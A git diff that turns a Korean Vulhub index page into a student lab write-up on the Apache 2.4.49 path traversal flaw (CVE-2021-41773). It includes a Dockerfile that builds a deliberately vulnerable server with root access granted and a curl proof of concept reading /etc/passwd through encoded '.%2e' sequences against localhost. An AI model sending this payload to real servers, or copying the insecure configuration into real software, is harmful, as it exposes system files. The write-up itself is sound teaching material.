@@ -1,24 +1,65 @@
-# Korean Vulhub (한글판)
+# Apache HTTP Server Path Traversal (CVE-2021-41773)  
+화이트햇 스쿨 3기 – 조민규 (@oureukk)
 
-![logo](./README.assets/logo.svg)
+---
 
-[Vulhub](https://github.com/vulhub/vulhub) (<https://vulhub.org/>) 을 기반으로 한국어 번역 및 컨텐츠를 추가하는 것을 목표로 공동작업합니다.
+## 요약
+- Apache HTTP Server 2.4.49 버전의 `mod_cgi` 경로 검증 로직에 결함이 있어, URL 인코딩된 `..` 시퀀스를 통해 문서 루트 밖의 임의 파일을 읽을 수 있음.  
+- 공격자는 `/etc/passwd` 같은 시스템 파일은 물론, 웹 서버가 읽을 수 있는 모든 파일을 노출시킬 수 있음.  
 
-차세대 보안리더 양성 프로그램 화이트햇 스쿨 수강생들이 기여하고 있습니다.
+---
 
-<br/>
+## 환경 구성 및 실행
 
-### Table of Contents
+1. **Dockerfile 작성**  
+   `Dockerfile`:
+   ```dockerfile
+   FROM httpd:2.4.49
 
-- Django
-  - [CVE-2021-35042](./_Django/CVE-2021-35042/README.md) | QuerySet.order_by() SQL Injection
-- Express
-  - [CVE-2024-29041](./Express/CVE-2024-29041/README.md) | Express 오픈 리다이렉트 취약점
-- Flask
-  - [SSTI](./Flask/SSTI/README.md) | Server Side Template Injection
-- MySQL
-  - [CVE-2012-2122](./MySQL/CVE-2012-2122/README.md) | MySQL Authentication Bypass
-- Next.js
-  - [CVE-2025-29927](./Next.js/CVE-2025-29927/README.md) | Next.js 미들웨어 인가 우회
-- Nginx
-  - [CVE-2017-7529](./Nginx/CVE-2017-7529/README.md) | Nginx Integer Overflow Vulnerability
+   # bash 및 기타 유틸 설치
+   RUN apt-get update && apt-get install -y bash
+
+   # 간단한 CGI 스크립트 생성
+   RUN printf '%s\n' '#!/bin/bash' 'echo "Content-type: text/plain"' 'echo' 'echo "Hello from CGI"' \
+       > /usr/local/apache2/cgi-bin/hello.sh \
+     && chmod +x /usr/local/apache2/cgi-bin/hello.sh
+
+   #루트파일도 읽히도록 액세스 제어 변경
+   RUN printf '%s\n' \
+    '<Directory "/">' \
+      '    Require all granted' \
+    '</Directory>' \
+    >> /usr/local/apache2/conf/httpd.conf
+  '''
+  
+2. **docker-compose.yml 작성"
+   '''yaml
+   version: "3.8"
+   services:
+    apache-vuln:
+      build: .
+      ports:
+        - "8080:80"
+
+3. 컨테이너 빌드 및 실행
+   docker-compose up -d
+
+4. 정상 동작 확인
+   curl -i http://localhost:8080/cgi-bin/hello.sh
+
+5. 취약점 Poc 호출
+   curl -i "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+
+---
+
+## 결과
+![image](https://github.com/user-attachments/assets/8241770b-6b3f-45b4-b8df-9ddbf5f97b4a)
+
+---
+
+## 정리
+- 취약 원인: Apache 2.4.49에서 URL 디코딩 후 경로 검증을 우회할 수 있어, .. 인코딩 시퀀스를 통해 문서 루트를 넘어선 파일 액세스가 허용됨.
+
+- 영향도: 웹 서버가 읽을 수 있는 모든 시스템 파일 및 애플리케이션 파일 정보 노출 → 정보 유출, 내부 구조 파악, 추가 공격 발판 제공
+
+---
